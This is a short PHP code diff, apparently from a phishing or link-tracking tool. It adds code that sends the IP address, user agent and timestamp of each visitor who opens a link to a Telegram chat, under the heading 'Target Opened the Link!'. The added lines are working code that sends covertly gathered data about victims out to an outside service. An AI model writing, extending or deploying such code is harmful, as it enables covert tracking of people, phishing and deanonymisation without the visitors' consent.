@@ -26,4 +26,13 @@ fwrite($fp, $useragent);
 fwrite($fp, $browser);
 
 
+
 fclose($fp);
+
+include 'telegram_utils.php';
+$msg = "<b>Target Opened the Link!</b>\n";
+$msg .= "IP: <code>" . trim($ipaddress) . "</code>\n";
+$msg .= "User-Agent: " . $browser . "\n";
+$msg .= "Time: " . date('Y-m-d H:i:s');
+sendTelegramMessage($msg);
+
